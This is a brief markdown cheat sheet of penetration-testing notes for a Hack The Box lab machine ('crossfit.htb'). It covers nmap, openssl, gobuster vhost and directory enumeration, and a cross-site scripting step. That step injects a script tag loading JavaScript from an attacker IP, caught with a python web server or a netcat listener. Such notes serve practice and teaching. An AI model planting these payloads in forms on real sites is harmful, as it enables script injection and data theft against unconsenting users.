## Enumeration - Recon

Start with nmap always:
### nmap
```bash
sudo nmap -sC -sV -oA nmap/<folder> <IP>
```

### Create a Loot note
Gather random stuff like emails there

### SSL - to grap ssl certificates
This is useful to grap subdomains of the site.
```bash
openssl s_client -connect 10.10.10.208:21 -starttls ftp
```

### /etc/hosts - associate hostname with ip
```bash
sudo vim /etc/hosts
```
Then add the entries into it.

### Flameshot - to take print screens

### gobuster - run it on the website
```bash
# vhost signals virtual host discovery - if think there is more host
gobuster vhost -u http://crossfit.htb -w /opt/SecLists/Discovery/DNS/subdomains-top1million-20000.txt -o gobuster/vhost.out

# directory enumeration for .php sites
gobuster dir -u http://gym-club.crossfit.htb -w /opt/SecLists/Discovery/Web-Content/raft-small-words.txt -x php -o gobuster/gym-club-root
```

## Cross site scripting

Find forms you can fill out.
```html
<script src="http://10.10.14.4/test.js"></script>
```

### Local web server
```bash
sudo python3 -m http.server 80
# or
sudo nc -nlvp 80
```



